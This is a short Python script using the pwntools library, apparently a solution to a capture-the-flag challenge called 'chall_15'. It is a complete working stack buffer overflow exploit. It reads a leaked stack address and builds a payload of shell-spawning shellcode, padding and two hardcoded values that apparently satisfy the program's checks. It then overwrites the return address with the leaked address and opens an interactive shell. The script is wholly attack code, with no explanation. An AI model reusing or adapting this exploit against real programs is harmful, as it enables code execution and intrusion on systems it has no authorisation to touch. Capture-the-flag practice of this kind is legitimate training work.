# coding: utf-8
from pwn import *
pr = process("./chall_15")
context.arch = "amd64"
asm_shell = asm(shellcraft.sh())
pr.recvuntil("Sometimes the canary is in the coal mine, sometimes the canary is on the stack, and sometimes ... baked beans")
ovr_flow = pr.recv()
payload = asm_shell + b'A' * 232 + p32(0xdeadd00d) + p32(0xb16b00b5) +b'A'*8+ p64(int(ovr_flow,16))
pr.sendline(payload)
pr.interactive()
pr.close()
